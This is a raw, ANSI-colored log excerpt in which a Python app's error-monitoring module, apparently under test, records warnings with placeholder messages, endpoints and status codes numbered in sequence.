WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721248Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 698'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 699'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 700'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 701'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 702'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721488Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 703'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721536Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 704'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 705'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721630Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 706'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721720Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 707'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721800Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 708'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 709'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 710'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 711'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 712'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722070Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 713'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 714'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722167Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 715'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 716'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722343Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 717'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 718'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 719'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 720'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 721'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 722'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 723'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 724'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722765Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 725'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722814Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 726'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722862Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 727'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722909Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 728'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.722957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 729'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723004Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 730'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 731'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 732'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723146Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 733'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 734'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 735'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 736'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 737'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
